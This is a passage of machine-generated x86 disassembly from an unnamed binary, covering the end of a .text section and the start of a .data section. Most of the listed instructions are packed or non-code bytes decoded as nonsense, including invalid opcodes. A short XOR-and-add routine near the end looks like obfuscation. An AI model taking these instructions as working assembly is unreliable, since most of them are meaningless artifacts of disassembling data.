  411a53:	or     ebx,DWORD PTR [ebx+ebp*1]
  411a56:	outs   dx,BYTE PTR ds:[esi]
  411a57:	jo     0x4119f6
  411a59:	adc    eax,0x8c02b014
  411a5e:	js     0x411a07
  411a60:	fimul  DWORD PTR [esi+0x12]
  411a63:	sub    DWORD PTR [edx-0x49a3f46],esp
  411a69:	out    dx,al
  411a6a:	jmp    0x411a17
  411a6c:	cs mov cl,0x9f
  411a6f:	aas    
  411a70:	aad    0x67
  411a72:	mov    al,0x14
  411a74:	adc    ch,BYTE PTR [ecx-0x3]
  411a77:	push   ebx
  411a78:	cmp    DWORD PTR [edi+0x2bf8dc82],0x487ca385
  411a82:	retf   
  411a83:	or     al,0xe8
  411a85:	pop    ecx
  411a86:	pop    ecx
  411a87:	inc    esi
  411a88:	sub    eax,0x81a86583
  411a8d:	mov    dl,0xb1
  411a8f:	(bad)  
  411a90:	mov    WORD PTR [ebp+0x24be9275],gs
  411a96:	fnsetpm(287 only) 
  411a98:	jle    0x411a9d
  411a9a:	jmp    0x4a83d0af
  411a9f:	pop    ebp
  411aa0:	test   DWORD PTR [ebp+0x744084fe],eax
  411aa6:	div    esi
  411aa8:	test   eax,0xeaab40a3
  411aad:	repz sub BYTE PTR [eax+0x288bf3f0],cl
  411ab4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411ab5:	(bad)  [esi+0x624ee27d]
  411abb:	add    DWORD PTR [ebp+0x4],edi
  411abe:	jmp    0x7a12e7be
  411ac3:	or     ecx,DWORD PTR [ecx-0x3a]
  411ac6:	xchg   esp,eax
  411ac7:	xchg   ecx,eax
  411ac8:	jns    0x411b0b
  411aca:	scas   al,BYTE PTR es:[edi]
  411acb:	pushf  
  411acc:	fcom   QWORD PTR [edi+0x11b5ec23]
  411ad2:	mov    dl,0x62
  411ad4:	jns    0x411b0f
  411ad6:	inc    esp
  411ad7:	inc    ecx
  411ad8:	loope  0x411a73
  411ada:	sbb    dl,BYTE PTR [edx]
  411adc:	push   ebp
  411add:	add    ebx,eax
  411adf:	out    dx,eax
  411ae0:	add    al,0x76
  411ae2:	imul   ebx,esp,0x418d4728
  411ae8:	int    0x3d
  411aea:	mov    al,ds:0x6baadf8f
  411aef:	adc    eax,0xb994f418
  411af4:	int    0x10
  411af6:	jl     0x411ad3
  411af8:	inc    ebp
  411af9:	and    al,0x35
  411afb:	int3   
  411afc:	or     al,0x67
  411afe:	fwait
  411aff:	test   edx,esi
  411b01:	and    al,0x47
  411b03:	fistp  WORD PTR [eax]
  411b05:	pop    eax
  411b06:	sti    
  411b07:	sbb    DWORD PTR [edi+edi*2+0x37],0x7b
  411b0c:	mov    ebx,0xc2da5555
  411b11:	mov    ss,ecx
  411b13:	das    
  411b14:	dec    esp
  411b15:	sub    DWORD PTR [edi+0x7f2c7070],ebx
  411b1b:	mov    eax,0x74fd9bac
  411b20:	hlt    
  411b21:	ret    0xdb4e
  411b24:	push   ebp
  411b25:	lods   eax,DWORD PTR ds:[esi]
  411b26:	into   
  411b27:	outs   dx,BYTE PTR ds:[esi]
  411b28:	jmp    FWORD PTR [edi+0x3a]
  411b2b:	mov    ds:0x1ab05724,eax
  411b30:	sbb    eax,ecx
  411b32:	rol    DWORD PTR [esi-0x5d],cl
  411b35:	push   cs
  411b36:	mov    esp,0x934955c9
  411b3b:	xchg   ecx,eax
  411b3c:	(bad)  
  411b3d:	sub    eax,0x998efd13
  411b42:	xchg   ebp,eax
  411b43:	mov    edi,0xd1d4bd91
  411b48:	fadd   st,st(0)
  411b4a:	leave  
  411b4b:	sbb    DWORD PTR [esi+0x4a16b76b],esp
  411b51:	adc    BYTE PTR [ecx+0x2298b6b2],bh
  411b57:	push   0xffffffc1
  411b59:	inc    esi
  411b5a:	jl     0x411ba3
  411b5c:	pop    ecx
  411b5d:	dec    edi
  411b5e:	out    dx,eax
  411b5f:	sti    
  411b60:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411b61:	loope  0x411b8d
  411b63:	pop    ds
  411b64:	loope  0x411b69
  411b66:	dec    ebp
  411b67:	jbe    0x411b32
  411b69:	out    dx,eax
  411b6a:	cmc    
  411b6b:	or     DWORD PTR [edi+0x32b5949d],eax
  411b71:	jo     0x411b58
  411b73:	(bad)  
  411b75:	xlat   BYTE PTR ds:[ebx]
  411b76:	ror    esp,1
  411b78:	dec    edi
  411b79:	std    
  411b7a:	lods   eax,DWORD PTR ds:[esi]
  411b7b:	out    0x9b,al
  411b7d:	jl     0x411bb3
  411b7f:	or     bh,0x8f
  411b82:	outs   dx,DWORD PTR ds:[esi]
  411b83:	shr    dh,cl
  411b85:	cmp    al,0x46
  411b87:	pop    es
  411b88:	add    eax,0x1e27bcc7
  411b8d:	and    al,BYTE PTR [ecx-0x79]
  411b90:	ins    BYTE PTR es:[edi],dx
  411b91:	fcomp  QWORD PTR ds:0x8c0d9dd7
  411b97:	mov    bh,0x66
  411b99:	dec    esi
  411b9a:	push   ecx
  411b9b:	test   eax,0x8b38d312
  411ba0:	sbb    bl,dl
  411ba2:	sbb    esi,DWORD PTR [ebp-0x3a89e738]
  411ba8:	es (bad) 
  411bab:	leave  
  411bac:	ds xchg edi,eax
  411bae:	stos   DWORD PTR es:[edi],eax
  411baf:	lods   eax,DWORD PTR ds:[esi]
  411bb0:	pop    esp
  411bb1:	xchg   edx,eax
  411bb2:	in     eax,dx
  411bb3:	fucomi st,st(1)
  411bb5:	mov    cl,bh
  411bb7:	jns    0x411c37
  411bb9:	iret   
  411bba:	sbb    ah,dh
  411bbc:	cmp    bl,BYTE PTR [ebx]
  411bbe:	xor    al,0x25
  411bc0:	jnp    0x411b42
  411bc2:	lds    esp,FWORD PTR [esi]
  411bc4:	loope  0x411c12
  411bc6:	jp     0x411c1b
  411bc8:	repnz inc ecx
  411bca:	mov    al,ds:0xe3c2be16
  411bcf:	enter  0x2e8e,0xd9
  411bd3:	and    ecx,DWORD PTR [ebp-0x10348a7a]
  411bd9:	dec    ebp
  411bda:	pop    ebx
  411bdb:	mov    WORD PTR [eax],?
  411bdd:	mov    edi,0xae08c75e
  411be2:	adc    esp,DWORD PTR [ebx+eiz*4-0x7ccfb693]
  411be9:	mov    ch,0x8a
  411beb:	mov    DWORD PTR [ecx-0x6f],eax
  411bee:	daa    
  411bef:	orps   xmm5,xmm6
  411bf2:	out    dx,al
  411bf3:	test   BYTE PTR [ebp+0x2b],dh
  411bf6:	pop    esi
  411bf7:	loopne 0x411c64
  411bf9:	xchg   DWORD PTR [eax+0x18e2ffe5],edx
  411bff:	icebp  
  411c00:	loop   0x411bbe
  411c02:	push   esp
  411c03:	clc    
  411c04:	xchg   edi,eax
  411c05:	pop    ebx
  411c06:	xchg   edx,eax
  411c07:	and    BYTE PTR [esi-0x335cd9bb],ah
  411c0d:	icebp  
  411c0e:	in     al,0x18
  411c10:	scas   al,BYTE PTR es:[edi]
  411c11:	pusha  
  411c12:	mov    edx,0x10330797
  411c17:	push   esi
  411c18:	fbstp  TBYTE PTR [edx]
  411c1a:	or     ebx,ebx
  411c1c:	les    esi,FWORD PTR [eax]
  411c1e:	enter  0xb947,0xb1
  411c22:	(bad)  
  411c23:	fcomp  QWORD PTR [edi-0x31]
  411c26:	mov    ah,0x71
  411c28:	xor    BYTE PTR ss:[eax],ah
  411c2b:	cmp    al,0x32
  411c2d:	and    esi,DWORD PTR [ecx-0x35db1ad4]
  411c33:	mov    eax,0x92c34495
  411c38:	ret    
  411c39:	retf   
  411c3a:	and    BYTE PTR [ebp+0x33],ch
  411c3d:	ret    0x8b56
  411c40:	jne    0x411c4a
  411c42:	mov    ecx,0x32729b
  411c47:	add    eax,ecx
  411c49:	jmp    0x411e84
  411c4e:	mov    WORD PTR [eax-0x1a6d186e],cs
  411c54:	imul   esi,DWORD PTR [ecx-0x48],0x56dad6c4
  411c5b:	xchg   DWORD PTR [edx+0x7e4bc77c],edx
  411c61:	jle    0x411c73
  411c63:	jl     0x411ce3
  411c65:	jle    0x411cba
  411c67:	mov    eax,0xb74a9b40
  411c6c:	pop    esi
  411c6d:	jb     0x411cb0
  411c6f:	rcr    DWORD PTR ds:[eax-0x57da37a],0x1e
  411c77:	dec    edx
  411c78:	xor    eax,0xd5863930
  411c7d:	xor    esp,DWORD PTR [ebp*4-0x47cf5332]
  411c84:	retf   0xc13a
  411c87:	add    DWORD PTR [esi],esp
  411c89:	ret    0xebf5
  411c8c:	mov    bl,0x37
  411c8e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411c8f:	dec    esp
  411c90:	cmp    al,0xca
  411c92:	sbb    esp,DWORD PTR [edi-0x7cd588cf]
  411c98:	(bad)  
  411c99:	(bad)  
  411c9a:	dec    eax
  411c9b:	int    0xea
  411c9d:	mov    ah,0xa
  411c9f:	xlat   BYTE PTR ds:[ebx]
  411ca0:	gs loop 0x411cfc
  411ca3:	xlat   BYTE PTR ds:[ebx]
  411ca4:	shr    ch,0x35
  411ca7:	rol    DWORD PTR [ebp-0x2f8c73dc],1
  411cad:	sbb    BYTE PTR [eax-0x29],ah
  411cb0:	xor    dl,BYTE PTR [ebx-0x18]
  411cb3:	push   0xf51ed74e
  411cb8:	loopne 0x411d32
  411cba:	popa   
  411cbb:	and    eax,0x59e48071
  411cc0:	pop    ds
  411cc1:	sbb    DWORD PTR [ecx-0x40],edx
  411cc4:	jg     0x411d14
  411cc6:	or     eax,0xcc1d40db
  411ccb:	adc    ecx,DWORD PTR [ebp-0x2c6295b0]
  411cd1:	mov    ch,0xb7
  411cd3:	xchg   esp,eax
  411cd4:	add    ebp,0xffffffb4
  411cd7:	sub    eax,0xe21bb3e5
  411cdc:	inc    edx
  411cdd:	jb     0x411cee
  411cdf:	shl    esi,cl
  411ce1:	cmp    bh,BYTE PTR [ecx]
  411ce3:	arpl   WORD PTR [ecx],sp
  411ce5:	sbb    BYTE PTR ds:0xfffb68c1,bl
  411ceb:	clc    
  411cec:	cmp    eax,0x17ebf8d7
  411cf1:	in     eax,0xde
  411cf3:	lahf   
  411cf4:	sbb    BYTE PTR [ebx-0x3ccc1b51],al
  411cfa:	push   ds
  411cfb:	push   ebp
  411cfc:	out    0xbb,eax
  411cfe:	pop    es
  411cff:	aaa    
  411d00:	add    ebp,DWORD PTR ds:0xea29b34a
  411d06:	test   DWORD PTR [ebx-0x66],0xefcf1799
  411d0d:	inc    esp
  411d0e:	add    eax,0x7ce13f52
  411d13:	add    BYTE PTR [edi],cl
  411d15:	out    dx,al
  411d16:	mov    eax,gs:0x39ad559a
  411d1c:	mov    ds,WORD PTR [ebx+0x15]
  411d1f:	mov    esp,0x3379d1d1
  411d24:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411d25:	xor    al,0xdd
  411d27:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411d28:	xchg   esp,eax
  411d29:	mov    edi,0x53e6111
  411d2e:	(bad)  
  411d30:	push   cs
  411d31:	into   
  411d32:	mov    edx,0x25b77591
  411d37:	shl    DWORD PTR [eax+0x43],1
  411d3a:	mov    ah,0xe9
  411d3c:	iret   
  411d3d:	lods   eax,DWORD PTR ds:[esi]
  411d3e:	and    BYTE PTR [eax+0xe2e7c44],dh
  411d44:	sbb    al,0xd
  411d46:	cli    
  411d47:	cmp    eax,0x93b440b6
  411d4c:	sub    bl,ah
  411d4e:	jmp    0xf75cea9b
  411d53:	clc    
  411d54:	in     al,0xc5
  411d56:	mov    esi,0x4d7b3d87
  411d5b:	sar    cl,1
  411d5d:	jg     0x411d50
  411d5f:	inc    eax
  411d60:	ss push ebx
  411d62:	aaa    
  411d63:	dec    edi
  411d64:	pop    ebp
  411d65:	add    ebp,ebx
  411d67:	addr16 mov esp,0x40b33bbd
  411d6d:	fdivp  st(2),st
  411d6f:	popa   
  411d70:	jle    0x411d35
  411d72:	push   ebx
  411d73:	inc    ebx
  411d74:	fldenv [ebp-0x39c4f4b]
  411d7a:	mov    cr7,esi
  411d7d:	mov    ecx,0x7ed1d72e
  411d82:	mov    cl,0xf1
  411d84:	cld    
  411d85:	sar    DWORD PTR [eax+ebx*8],0x6
  411d89:	inc    edx
  411d8a:	push   0x6c155f8e
  411d8f:	xlat   BYTE PTR ds:[ebx]
  411d90:	bound  eax,QWORD PTR [edi]
  411d92:	bound  ebp,QWORD PTR [edi-0x34]
  411d95:	test   al,0xe5
  411d97:	mov    dl,0xc5
  411d99:	(bad)  
  411d9a:	aaa    
  411d9b:	mov    esp,0x6eee40d
  411da0:	push   es
  411da1:	ror    DWORD PTR [esi+0x40],0xb1
  411da5:	sbb    BYTE PTR gs:[eax],bh
  411da8:	lock ror ecx,0xb2
  411dac:	jmp    esp
  411dae:	xchg   ecx,eax
  411daf:	xchg   edx,eax
  411db0:	js     0x411d33
  411db2:	(bad)  
  411db4:	pop    eax
  411db5:	adc    BYTE PTR [eax-0x748d1247],bl
  411dbb:	or     dh,dh
  411dbd:	scas   al,BYTE PTR es:[edi]
  411dbe:	mov    bl,0x71
  411dc0:	ss push ebp
  411dc2:	rcr    BYTE PTR [edx-0x74],1
  411dc5:	jle    0x411de7
  411dc7:	out    0xf9,eax
  411dc9:	mov    ah,0x11
  411dcb:	aam    0xd
  411dcd:	addr16 (bad) 
  411dcf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411dd0:	cs adc al,0xa2
  411dd3:	fiadd  WORD PTR [ecx-0x4e983fac]
  411dd9:	hlt    
  411dda:	adc    ecx,esi
  411ddc:	and    ebp,DWORD PTR [edi+0x57]
  411ddf:	adc    BYTE PTR [ecx-0x1c],0x3f
  411de3:	or     eax,0x58f5d9e1
  411de8:	ret    
  411de9:	xor    dh,BYTE PTR [ecx+0x39b29364]
  411def:	fcmove st,st(2)
  411df1:	mov    eax,0xb223f79c
  411df6:	pop    esp
  411df7:	xchg   edx,eax
  411df8:	xor    ebp,DWORD PTR ss:[ecx]
  411dfb:	sbb    ecx,DWORD PTR [eax-0x77]
  411dfe:	and    al,0xbd
  411e00:	sub    edx,ebx
  411e02:	nop
  411e03:	pop    ebx
  411e04:	ret    
  411e05:	sti    
  411e06:	mov    ebx,0xb2dfb835
  411e0b:	jne    0x411e6d
  411e0d:	scas   eax,DWORD PTR es:[edi]
  411e0e:	push   cs
  411e0f:	add    DWORD PTR [ebx],0x5e
  411e12:	push   ss
  411e13:	xchg   ecx,eax
  411e14:	(bad)  
  411e15:	cli    
  411e16:	das    
  411e17:	jo     0x411da8
  411e19:	ffreep st(7)
  411e1b:	fist   WORD PTR [esi+0x4cef1d6f]
  411e21:	jmp    0xda8d365f
  411e26:	adc    BYTE PTR [ebp+ebx*4+0x6c08d7ad],dh
  411e2d:	repz jns 0x411ea7
  411e30:	dec    ebx
  411e31:	into   
  411e32:	xchg   BYTE PTR [edi+0xe],dh
  411e35:	cld    
  411e36:	add    eax,0x98a981e
  411e3b:	jmp    0x411e08
  411e3d:	repnz scas eax,DWORD PTR es:[edi]
  411e3f:	push   cs
  411e40:	pop    ebp
  411e41:	icebp  
  411e42:	push   esp
  411e43:	mov    dh,0xf0
  411e45:	jmp    0x6170e190
  411e4a:	pop    eax
  411e4b:	push   ss
  411e4c:	and    bh,BYTE PTR [ebx+ecx*2]
  411e4f:	repnz push edi
  411e51:	out    0x89,eax
  411e53:	sbb    ch,BYTE PTR [ebx]
  411e55:	jnp    0x411eb1
  411e57:	ss js  0x411def
  411e5a:	(bad)  
  411e5b:	ret    0xe4ae
  411e5e:	js     0x411e70
  411e60:	gs call 0xdcf4:0xaa305892
  411e68:	or     BYTE PTR [eax+0x49346287],al
  411e6e:	ja     0x411e31
  411e70:	ja     0x411e33
  411e72:	test   cl,0x93
  411e75:	inc    ebx
  411e76:	fisttp QWORD PTR [ebx]
  411e78:	les    ebp,FWORD PTR [edi+0xf]
  411e7b:	dec    esi
  411e7c:	sbb    eax,esp
  411e7e:	push   ds
  411e7f:	std    
  411e80:	gs pop edx
  411e82:	jl     0x411eeb
  411e84:	cmp    DWORD PTR [esi+0x54],eax
  411e87:	pop    esi
  411e88:	je     0x411e96
  411e8e:	mov    eax,DWORD PTR [ebp+0x8]
  411e91:	jmp    0x411eaf
  411e96:	mov    eax,DWORD PTR [ebp-0x4]
  411e99:	xor    eax,edx
  411e9b:	add    eax,ecx
  411e9d:	jmp    0x411eaf
  411ea2:	mov    eax,DWORD PTR [ebp-0x4]
  411ea5:	xor    eax,0x7510854
  411eaa:	add    eax,0x32729b
  411eaf:	leave  
  411eb0:	ret    0x4

Disassembly of section .data:

00412000 <.data>:
  412000:	sub    BYTE PTR [ecx],0x1
  412003:	add    BYTE PTR [edx-0x5dfffed7],dl
  412009:	sub    DWORD PTR [ecx],eax
  41200b:	add    BYTE PTR [eax-0x41fffed7],dh
  412011:	sub    DWORD PTR [ecx],eax
  412013:	add    ah,dl
  412015:	sub    DWORD PTR [ecx],eax
  412017:	add    ah,ah
  412019:	sub    DWORD PTR [ecx],eax
  41201b:	add    dh,dh
  41201d:	sub    DWORD PTR [ecx],eax
  41201f:	add    BYTE PTR [edx],al
  412021:	sub    al,BYTE PTR [ecx]
  412023:	add    BYTE PTR [edx+ebp*1],dl
  412026:	add    DWORD PTR [eax],eax
  412028:	and    BYTE PTR [edx],ch
  41202a:	add    DWORD PTR [eax],eax
  41202c:	sub    al,BYTE PTR cs:[ecx]
  41202f:	add    BYTE PTR [esi+0x2a],al
  412032:	add    DWORD PTR [eax],eax
  412034:	pop    eax
  412035:	sub    al,BYTE PTR [ecx]
  412037:	add    BYTE PTR [esi+0x2a],ah
  41203a:	add    DWORD PTR [eax],eax
  41203c:	js     0x412068
  41203e:	add    DWORD PTR [eax],eax
  412040:	mov    gs,WORD PTR [edx]
  412042:	add    DWORD PTR [eax],eax
  412044:	sahf   
  412045:	sub    al,BYTE PTR [ecx]
  412047:	add    BYTE PTR [edx-0x35fffed6],dh
  41204d:	sub    al,BYTE PTR [ecx]
  41204f:	add    dh,bl
  412051:	sub    al,BYTE PTR [ecx]
  412053:	add    dl,ch
  412055:	sub    al,BYTE PTR [ecx]
  412057:	add    ah,bh
  412059:	sub    al,BYTE PTR [ecx]
  41205b:	add    BYTE PTR [edx],dl
  41205d:	sub    eax,DWORD PTR [ecx]
  41205f:	add    BYTE PTR [esi],bl
  412061:	sub    eax,DWORD PTR [ecx]
  412063:	add    BYTE PTR [ebx+ebp*1],ch
  412066:	add    DWORD PTR [eax],eax
  412068:	inc    eax
  412069:	sub    eax,DWORD PTR [ecx]
  41206b:	add    BYTE PTR [esi+0x2b],cl
  41206e:	add    DWORD PTR [eax],eax
  412070:	sub    eax,DWORD PTR fs:[ecx]
  412073:	add    BYTE PTR [edx+0x2b],dh
  412076:	add    DWORD PTR [eax],eax
  412078:	test   BYTE PTR [ebx],ch
  41207a:	add    DWORD PTR [eax],eax
  41207c:	mov    gs,WORD PTR [ebx]
  41207e:	add    DWORD PTR [eax],eax
  412080:	sahf   
  412081:	sub    eax,DWORD PTR [ecx]
  412083:	add    BYTE PTR [eax-0x3bfffed5],bh
  412089:	sub    eax,DWORD PTR [ecx]
  41208b:	add    al,dl
  41208d:	sub    eax,DWORD PTR [ecx]
  41208f:	add    ah,ch
  412091:	sub    eax,DWORD PTR [ecx]
  412093:	add    ah,bh
  412095:	sub    eax,DWORD PTR [ecx]
  412097:	add    BYTE PTR [edx],cl
  412099:	sub    al,0x1
  41209b:	add    BYTE PTR [eax],bl
  41209d:	sub    al,0x1
  41209f:	add    BYTE PTR [esp+ebp*1],ah
  4120a2:	add    DWORD PTR [eax],eax
  4120a4:	cmp    BYTE PTR [ecx+eax*1],ch
  4120a7:	add    BYTE PTR [esi+0x2c],cl
  4120aa:	add    DWORD PTR [eax],eax
  4120ac:	pop    edx
  4120ad:	sub    al,0x1
  4120af:	add    BYTE PTR [edx+0x2c],ch
  4120b2:	add    DWORD PTR [eax],eax
  4120b4:	jl     0x4120e2
  4120b6:	add    DWORD PTR [eax],eax
  4120b8:	mov    gs,WORD PTR [ecx+eax*1]
  4120bb:	add    BYTE PTR [eax-0x47fffed4],ah
  4120c1:	sub    al,0x1
  4120c3:	add    al,cl
  4120c5:	sub    al,0x1
  4120c7:	add    dh,dl
  4120c9:	sub    al,0x1
  4120cb:	add    ah,ah
  4120cd:	sub    al,0x1
  4120cf:	add    dh,dh
  4120d1:	sub    al,0x1
  4120d3:	add    BYTE PTR [esi],al
  4120d5:	sub    eax,0x2d140001
  4120da:	add    DWORD PTR [eax],eax
  4120dc:	es sub eax,0x2d3c0001
  4120e2:	add    DWORD PTR [eax],eax
  4120e4:	dec    edx
  4120e5:	sub    eax,0x2d5a0001
  4120ea:	add    DWORD PTR [eax],eax
  4120ec:	push   0x2d
  4120ee:	add    DWORD PTR [eax],eax
  4120f0:	je     0x41211f
  4120f2:	add    DWORD PTR [eax],eax
  4120f4:	test   BYTE PTR ds:0x2d900001,ch
  4120fa:	add    DWORD PTR [eax],eax
  4120fc:	sahf   
  4120fd:	sub    eax,0x2daa0001
  412102:	add    DWORD PTR [eax],eax
  412104:	mov    eax,0xd000012d
  412109:	sub    eax,0x2dde0001
  41210e:	add    DWORD PTR [eax],eax
  412110:	out    dx,al
  412111:	sub    eax,0x2dfe0001
  412116:	add    DWORD PTR [eax],eax
  412118:	or     al,0x2e
  41211a:	add    DWORD PTR [eax],eax
  41211c:	push   ds
  41211d:	add    DWORD PTR cs:[eax],eax
  412120:	xor    ch,BYTE PTR [esi]
  412122:	add    DWORD PTR [eax],eax
  412124:	dec    esi
  412125:	add    DWORD PTR cs:[eax],eax
  412128:	pop    esi
  412129:	add    DWORD PTR cs:[eax],eax
  41212c:	je     0x41215c
  41212e:	add    DWORD PTR [eax],eax
  412130:	xchg   BYTE PTR [esi],ch
  412132:	add    DWORD PTR [eax],eax
  412134:	call   0x12e:0xac00012e
  41213b:	add    BYTE PTR [esi-0x33fffed2],bh
  412141:	add    DWORD PTR cs:[eax],eax
  412144:	fisubr DWORD PTR [esi]
  412146:	add    DWORD PTR [eax],eax
  412148:	out    dx,al
  412149:	add    DWORD PTR cs:[eax],eax
  41214c:	cli    
  41214d:	add    DWORD PTR cs:[eax],eax
  412150:	push   cs
  412151:	das    
  412152:	add    DWORD PTR [eax],eax
  412154:	push   ds
  412155:	das    
  412156:	add    DWORD PTR [eax],eax
  412158:	cs das 
  41215a:	add    DWORD PTR [eax],eax
  41215c:	inc    eax
  41215d:	das    
  41215e:	add    DWORD PTR [eax],eax
  412160:	pop    eax
  412161:	das    
  412162:	add    DWORD PTR [eax],eax
  412164:	outs   dx,BYTE PTR ds:[esi]
  412165:	das    
  412166:	add    DWORD PTR [eax],eax
  412168:	jle    0x412199
  41216a:	add    DWORD PTR [eax],eax
  41216c:	call   0x12f:0xae00012f
  412173:	add    BYTE PTR [edx-0x39fffed1],bh
  412179:	das    
  41217a:	add    DWORD PTR [eax],eax
  41217c:	aam    0x2f
  41217e:	add    DWORD PTR [eax],eax
  412180:	in     al,0x2f
  412182:	add    DWORD PTR [eax],eax
  412184:	cli    
  412185:	das    
  412186:	add    DWORD PTR [eax],eax
  412188:	or     al,0x30
  41218a:	add    DWORD PTR [eax],eax
  41218c:	push   ss
  41218d:	xor    BYTE PTR [ecx],al
  41218f:	add    BYTE PTR [esi],ch
  412191:	xor    BYTE PTR [ecx],al
  412193:	add    BYTE PTR [edx],bh
  412195:	xor    BYTE PTR [ecx],al
  412197:	add    BYTE PTR [eax+esi*1+0x1],cl
  41219b:	add    BYTE PTR [eax+0x30],bl
  41219e:	add    DWORD PTR [eax],eax
  4121a0:	jb     0x4121d2
  4121a2:	add    DWORD PTR [eax],eax
  4121a4:	jle    0x4121d6
  4121a6:	add    DWORD PTR [eax],eax
  4121a8:	mov    WORD PTR [eax],?
  4121aa:	add    DWORD PTR [eax],eax
  4121ac:	mov    ds:0xb8000130,al
  4121b1:	xor    BYTE PTR [ecx],al
  4121b3:	add    BYTE PTR [eax],al
  4121b5:	add    BYTE PTR [eax],al
  4121b7:	add    ah,dl
  4121b9:	xor    BYTE PTR [ecx],al
  4121bb:	add    al,ch
  4121bd:	xor    BYTE PTR [ecx],al
  4121bf:	add    BYTE PTR [eax],al
  4121c1:	xor    DWORD PTR [ecx],eax
  4121c3:	add    BYTE PTR [esi],dl
  4121c5:	xor    DWORD PTR [ecx],eax
  4121c7:	add    BYTE PTR [esi],ah
  4121c9:	xor    DWORD PTR [ecx],eax
  4121cb:	add    BYTE PTR [ecx+esi*1],dh
  4121ce:	add    DWORD PTR [eax],eax
  4121d0:	dec    esp
  4121d1:	xor    DWORD PTR [ecx],eax
  4121d3:	add    BYTE PTR [edx+0x31],bl
  4121d6:	add    DWORD PTR [eax],eax
  4121d8:	xor    WORD PTR [ecx],ax
  4121db:	add    BYTE PTR [eax+0x31],bh
  4121de:	add    DWORD PTR [eax],eax
  4121e0:	xchg   esp,eax
  4121e1:	xor    DWORD PTR [ecx],eax
  4121e3:	add    BYTE PTR [edx-0x49fffecf],ah
  4121e9:	xor    DWORD PTR [ecx],eax
  4121eb:	add    dh,al
  4121ed:	xor    DWORD PTR [ecx],eax
  4121ef:	add    dl,dl
  4121f1:	xor    DWORD PTR [ecx],eax
  4121f3:	add    ah,ah
  4121f5:	xor    DWORD PTR [ecx],eax
  4121f7:	add    ah,ch
  4121f9:	xor    DWORD PTR [ecx],eax
  4121fb:	add    ah,bh
  4121fd:	xor    DWORD PTR [ecx],eax
  4121ff:	add    BYTE PTR [esi],cl
  412201:	xor    al,BYTE PTR [ecx]
  412203:	add    BYTE PTR [edx+esi*1],bl
  412206:	add    DWORD PTR [eax],eax
  412208:	xor    al,BYTE PTR cs:[ecx]
  41220b:	add    BYTE PTR [eax+0x32],al
  41220e:	add    DWORD PTR [eax],eax
  412210:	push   esi
  412211:	xor    al,BYTE PTR [ecx]
  412213:	add    BYTE PTR [esi+0x32],ah
  412216:	add    DWORD PTR [eax],eax
  412218:	js     0x41224c
  41221a:	add    DWORD PTR [eax],eax
  41221c:	mov    dh,BYTE PTR [edx]
  41221e:	add    DWORD PTR [eax],eax
  412220:	call   0x132:0xb0000132
  412227:	add    al,al
  412229:	xor    al,BYTE PTR [ecx]
  41222b:	add    ah,cl
  41222d:	xor    al,BYTE PTR [ecx]
  41222f:	add    dl,ah
  412231:	xor    al,BYTE PTR [ecx]
  412233:	add    ah,dh
  412235:	xor    al,BYTE PTR [ecx]
  412237:	add    BYTE PTR [esi],al
  412239:	xor    eax,DWORD PTR [ecx]
  41223b:	add    BYTE PTR [esi],dl
  41223d:	xor    eax,DWORD PTR [ecx]
  41223f:	add    BYTE PTR [ebx+esi*1],ch
  412242:	add    DWORD PTR [eax],eax
  412244:	cmp    dh,BYTE PTR [ebx]
  412246:	add    DWORD PTR [eax],eax
  412248:	push   eax
  412249:	xor    eax,DWORD PTR [ecx]
  41224b:	add    BYTE PTR [ebx+esi*1+0x1],ah
  41224f:	add    BYTE PTR [edx+0x33],bh
  412252:	add    DWORD PTR [eax],eax
  412254:	cwde   
  412255:	xor    eax,DWORD PTR [ecx]
  412257:	add    BYTE PTR [eax-0x43fffecd],dh
  41225d:	xor    eax,DWORD PTR [ecx]
  41225f:	add    dh,cl
  412261:	xor    eax,DWORD PTR [ecx]
  412263:	add    dl,bl
  412265:	xor    eax,DWORD PTR [ecx]
  412267:	add    dh,ch
  412269:	xor    eax,DWORD PTR [ecx]
  41226b:	add    BYTE PTR [esi],al
  41226d:	xor    al,0x1
  41226f:	add    BYTE PTR [edx],dl
  412271:	xor    al,0x1
  412273:	add    BYTE PTR [eax],ah
  412275:	xor    al,0x1
  412277:	add    BYTE PTR [edx],dh
  412279:	xor    al,0x1
  41227b:	add    BYTE PTR [edx+0x34],al
  41227e:	add    DWORD PTR [eax],eax
  412280:	dec    esp
  412281:	xor    al,0x1
  412283:	add    BYTE PTR [eax],al
  412285:	add    BYTE PTR [eax],al
  412287:	add    BYTE PTR [esi+0x34],ah
  41228a:	add    DWORD PTR [eax],eax
  41228c:	je     0x4122c2
  41228e:	add    DWORD PTR [eax],eax
  412290:	xor    BYTE PTR [ecx+eax*1],0x0
  412294:	xchg   esp,eax
  412295:	xor    al,0x1
  412297:	add    BYTE PTR [eax],al
  412299:	add    BYTE PTR [eax],al
  41229b:	add    BYTE PTR [esi-0x43fffecc],ch
  4122a1:	xor    al,0x1
  4122a3:	add    dh,cl
  4122a5:	xor    al,0x1
  4122a7:	add    ah,bl
  4122a9:	xor    al,0x1
  4122ab:	add    ah,ah
  4122ad:	xor    al,0x1
  4122af:	add    ah,dh
  4122b1:	xor    al,0x1
  4122b3:	add    BYTE PTR [eax],al
  4122b5:	xor    eax,0x350e0001
  4122ba:	add    DWORD PTR [eax],eax
  4122bc:	push   ss
  4122bd:	xor    eax,0x35220001
  4122c2:	add    DWORD PTR [eax],eax
  4122c4:	sub    al,0x35
  4122c6:	add    DWORD PTR [eax],eax
  4122c8:	ss xor eax,0x353e0001
  4122ce:	add    DWORD PTR [eax],eax
  4122d0:	dec    eax
  4122d1:	xor    eax,0x35520001
  4122d6:	add    DWORD PTR [eax],eax
  4122d8:	pop    esp
  4122d9:	xor    eax,0x35680001
  4122de:	add    DWORD PTR [eax],eax
  4122e0:	je     0x412317
  4122e2:	add    DWORD PTR [eax],eax
  4122e4:	jle    0x41231b
  4122e6:	add    DWORD PTR [eax],eax
  4122e8:	mov    BYTE PTR ds:0x35920001,dh
  4122ee:	add    DWORD PTR [eax],eax
  4122f0:	mov    al,ds:0xa8000135
  4122f5:	xor    eax,0x35b40001
  4122fa:	add    DWORD PTR [eax],eax
  4122fc:	mov    esi,0xc8000135
  412301:	xor    eax,0x35d20001
  412306:	add    DWORD PTR [eax],eax
